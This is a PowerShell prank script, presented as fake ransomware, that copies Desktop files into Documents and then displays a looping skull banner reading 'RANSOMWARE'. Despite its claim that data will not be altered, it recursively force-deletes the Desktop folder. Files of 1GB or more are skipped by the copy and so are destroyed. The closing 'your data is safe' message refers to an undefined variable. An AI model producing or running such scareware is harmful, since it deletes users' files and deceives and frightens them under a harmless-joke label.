## IMPORTANT!! your data will NOT be altered. this is fake. check your Documents folder.

cls
$targetdir = "C:\Users\Username\Desktop"
$backupdir =  "C:\Users\Username\Documents"
$files = (get-childitem -File $targetdir -Depth 100).FullName | where { ! $_.PSIsContainer }
$part1 = Split-Path $files;
$fileextension = "cRypt0r"


#Copy folder structure
Robocopy $targetdir $backupdir /E /XF *.* | out-null

foreach ($file in $files)
{
#Ignore files bigger than 1GB
if(Get-ChildItem $file  | Where-Object {$_.Length -lt 1gb}){

#Copying file from targetdir to backupdir
$newdir = $file.Replace($targetdir,$backupdir)
Copy-Item $file $newdir



#Generate fake encrypted file
$encrypted = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($file))
$encrypted = $encrypted.Substring($encrypted.Length - 16).replace("=","")
$encrypted = $encrypted + ".$fileextension"
$path = Join-path -path (Split-Path $file) -ChildPath $encrypted





}}
remove-Item $targetdir -Recurse -force






write-host "your data is safe. check $backup_folder" -f Yellow

$intro = 
'
               uuuuuuu
             uu$$$$$$$$$$$uu |
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$"   "$$$"   "$$$$$$u
       "$$$$"      u$u       $$$$"
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         "$$$$uu$$$   $$$uu$$$$"
          "$$$$$$$"   "$$$$$$$"
            u$$$$$$$u$$$$$$$u
             u$"$"$"$"$"$"$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 """      ""$$$$$$$$$$$uu ""$"""
           uuuu ""$$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  $$$$$$$$$$""""           ""$$$$$$$$$$$"
   "$$$$$"                      ""$$$$""
     $$$"                         $$$$"
                                                                                                                                                    
 '
    1..99 | % {
        cls; ""; write-host $intro -ForegroundColor White;write "               RANSOMWARE";write "            MuHaHaHaHaHAHAHA!!!";""; Start-Sleep 1;}





